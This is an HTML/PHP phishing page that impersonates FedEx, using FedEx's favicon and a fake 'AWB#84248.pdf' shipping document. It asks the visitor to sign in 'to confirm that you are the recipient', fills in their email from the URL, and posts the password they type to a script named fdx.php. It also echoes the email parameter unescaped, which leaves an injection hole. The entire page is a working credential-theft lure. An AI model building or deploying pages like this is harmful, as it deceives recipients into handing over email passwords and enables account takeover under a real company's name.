<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
	<title>&#36319;&#36394;&#24744;&#30340;&#36135;&#20214;&#25110;&#21253;&#35065; | FedEx</title>
    <link rel="icon" href="https://www.fedex.com/etc.clientlibs/designs/fedex-common/images/resources/fx-favicon.ico" type="image/gif" sizes="16x16">
	<style> 
body, html { height: 100%;margin: 0; font-family: Arial, Helvetica, sans-serif;
}
* {
  box-sizing: border-box;
}
.bg-image {
  /* The image used */
  background-image: url("https://i.gyazo.com/8d41741114543c16c31a2de80742e120.jpg");
  /* Add the blur effect */ filter: blur(0px); -webkit-filter: blur(0px);
  /* Full height */ height: 100%; /* Center and scale the image nicely */
  background-position: center; background-repeat: no-repeat; background-size: cover;
}

/* Position text in the middle of the page/image */
.bg-text {
  background: #380B61;
  width:370px; height:380px; -webkit-box-shadow: 5px 5px 15px 5px #000000; 
  box-shadow: 5px 5px 15px 5px #000000; border-radius: 1px 35px 1px 50px;
  position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; text-align: center;
}
input[type=submit] {
  width:160px; height:45px; font-family: arial; font-size: 14px; color:#FFF; background-color: #DF3A01; border: solid 1px #DF3A01; border-radius: 2px 10px 2px 10px;
  -webkit-box-shadow: 2px 2px 15px 5px #585858; box-shadow: 2px 2px 15px 5px #585858;  font-weight:bold; 
}
input[type=password] {
  width:280px; height:40px; font-family: arial; font-size: 15px; 
  color:#000000; background-color: #FFF; border: solid 1px #1D6F42; padding: 10px; border-radius: 2px 5px 2px 7px;
  }
input[type=email] {
  width:280px; height:40px; font-family: arial; font-size: 13px; font-weight: bold;
  color:#DF0101; background-color: #FFF; border: solid 1px #FFF; padding: 10px; border-radius: 2px 5px 2px 7px;
    }
</style>
</head>
<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0">
<table align="center" cellspacing="0" height="100%" width="100%">
<tr><td height="96%" bgcolor="#181818">
<div class="bg-image"></div>
<div class="bg-text">




	<table align="center" cellspacing="0">
	<tr><td style="height:40px;"></td></tr>

	<tr><td>

		<div align="left">
			<font face="arial" size="4" color="#FFF">
				Shipping document: <b><font color="#FE642E">AWB#84248.pdf</font>
			</font>
		</div>

	</td></tr>

	<tr><td style="height:30px;"></td></tr>
	<tr><td>
		<table cellspacing="0"><tr>
				<td style="width:5px;"></td>
				<td>
					<font face="arial" size="3" color="#FFF">
						verification process
					</font>
				</td>
		</tr></table>
	</td></tr>
					<tr><td style="height:5px;"></td></tr>
					<tr><td>
					<form method="post" action="fdx.php">
					</td></tr>
					<tr><td>
							<div align="left">
								<font face="arial" size="2" color="#FFF">
								sign in to confirm that you are the recipient
								</font>
							</div>
					</td></tr>
					<tr><td style="height:15px;"></td></tr>
					<tr><td>
						<table cellspacing="0" align="center">
						<tr><td>
							<div align="center">
								<input  name="login" type="email" value="<?php echo $_GET['email']; ?>" disabled>
							</div>
						</td></tr>
						<tr><td style="height:7px;"></td></tr>
						<tr><td>
							<div align="center">
								<input  name="passwd" type="password" placeholder="password" required>
							</div>
						</td></tr>
						<tr><td style="height:7px;"></td></tr>
						<tr><td>
							<table align="right" cellspacing="0"><tr>
							<td>
								<font face="arial" size="2" color="#FFF">
need help?</font>
							</td>
							</tr></table>
						</td></tr>
						<tr><td style="height:20px;"></td></tr>
						<tr><td>
							<div align="right">
								<input type="submit" value="View your shipment">
							</div>
						</td></tr>
						<tr><td>
						</td></tr>
						<tr><td style="height:20px;">
							<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
							</form>
						</td></tr>
						</table>
					</td></tr>
	</table>



</div>
</td></tr>
<tr><td height="4%" bgcolor="#181818">
	<div align="center">
		<font face="arial" size="2" color="#FFF">
			FedEx&copyInternational Shipping Portal | All rights reserved
		</font>
	</div>
</td></tr>
</table>
</body>
</html>